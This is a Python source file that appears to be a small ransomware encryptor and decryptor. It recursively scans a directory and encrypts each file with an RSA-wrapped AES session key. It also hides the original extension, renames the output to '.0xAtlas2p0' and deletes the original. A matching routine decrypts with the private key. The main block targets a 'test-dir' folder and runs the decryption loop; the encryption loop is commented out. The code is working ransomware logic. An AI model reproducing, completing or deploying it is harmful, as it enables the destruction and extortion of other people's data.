import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from pathlib import Path

with open('public.pem', 'rb') as f:
    pubKey = f.read()


def scanRecurse(baseDir):
    
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey):

    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)

    with open(dataFile, 'rb') as f:
        data = f.read()
    

    data = bytes(data)

    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    bytes_extension = extension.encode('utf-8')
    cipher_extension = AES.new(sessionKey, AES.MODE_EAX)
    encrypted_extension, tag_extension = cipher_extension.encrypt_and_digest(bytes_extension)

    fileName = dataFile.split(extension)[0]


    encryptedFile = fileName + '.0xAtlas2p0'

    delimiter = b'$'

    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher_extension.nonce, tag_extension,
                               encrypted_extension, delimiter, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

    print('Encrypted file saved to ' + encryptedFile)


def decrypt(dataFile, privateKeyFile):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''

    # read private key from file
    with open(privateKeyFile, 'rb') as f:
        privateKey = f.read()
        # create private key object
        key = RSA.import_key(privateKey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key

        encryptedSessionKey = f.read(key.size_in_bytes())
        ext_nonce = f.read(16)
        tag_extension = f.read(16)
        cipher_extension = b''

        while True:
            byte = f.read(1)
            if byte == b'$':
                break
            else:
                cipher_extension += byte

        nonce, tag, ciphertext  = [ f.read(x) for x in (16, 16, -1) ]


    # decrypt the session key
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key

    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    cipher_new = AES.new(sessionKey, AES.MODE_EAX, ext_nonce)
    extension = cipher_new.decrypt_and_verify(cipher_extension, tag_extension)
    
    extension = extension.decode('utf-8')
    [fileName, _] = str(dataFile).split('.')
    decryptedFile = fileName + extension

    # save the decrypted data to file
    
    with open(decryptedFile, 'wb') as f:
        f.write(data)

    print('Decrypted file saved to ' + decryptedFile)
    os.remove(dataFile)
    
if __name__ == "__main__":

    directory = 'test-dir'
    # for item in scanRecurse(directory):
        
    #     filePath = Path(item)
    #     fileType = filePath.suffix.lower()

    #     encrypt(filePath, pubKey)
    
    for item in scanRecurse(directory):

        filePath = Path(item)
        fileType = filePath.suffix.lower()

            
        decrypt(filePath, 'private.pem')


# To Do: Refactor this garbage